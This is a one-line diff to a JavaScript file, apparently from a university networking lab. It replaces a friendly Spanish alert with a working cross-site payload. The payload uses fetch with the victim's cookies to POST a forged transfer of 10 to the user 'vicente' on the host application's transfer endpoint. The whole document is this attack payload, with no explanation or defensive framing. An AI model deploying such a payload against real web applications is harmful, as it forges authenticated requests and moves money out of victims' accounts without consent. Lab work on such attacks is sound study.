@@ -1,1 +1,1 @@
-alert('Buenas mike espero que vaya bien la práctica de redes :D');
+fetch('../../transfer',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({to_username:'vicente',amount:'10',note:'hola',submit:'Transferir'}),credentials:'include'}).then(r=>r.redirected?location.assign(r.url):r.text().then(console.log));
